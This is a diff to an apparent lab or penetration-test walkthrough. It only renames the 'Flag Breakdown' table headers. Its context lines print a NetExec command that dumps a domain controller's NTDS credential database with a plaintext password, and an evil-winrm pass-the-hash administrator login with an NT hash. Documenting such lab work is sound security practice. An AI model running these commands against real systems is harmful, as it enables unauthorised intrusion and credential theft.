@@ -133,9 +133,9 @@ After obtaining Domain Admin privileges through Token Impersonation, I used the 
 ```bash
 nxc smb 192.168.5.134 -u test -p '@shahin123#!' --ntds
 ```
-**Flag Breakdown**
+**Breakdown**
 
-|         Flag        |  Description  |
+|         Part        |  Description  |
 |---------------------|----------------|
 | `nxc`               | `NetExec` — a network penetration testing tool (successor to CrackMapExec)                        |
 | `smb`               | Protocol being used — Server Message Block (SMB)                                                |
@@ -190,9 +190,9 @@ no password needed.
 evil-winrm -i 192.168.5.134 -u 'administrator' -H 'fc525c9683e8fe067095ba2ddc971889'
 ```
 
-**Flag Breakdown**
+**Breakdown**
 
-| Flag | Description |
+| Part | Description |
 |-------------------------------|----------------------------------------------|
 | `evil-winrm` | A tool used to connect to Windows machines remotely using the WinRM protocol. |
 | `-i 192.168.5.134` | Specifies the IP address of the target machine. |
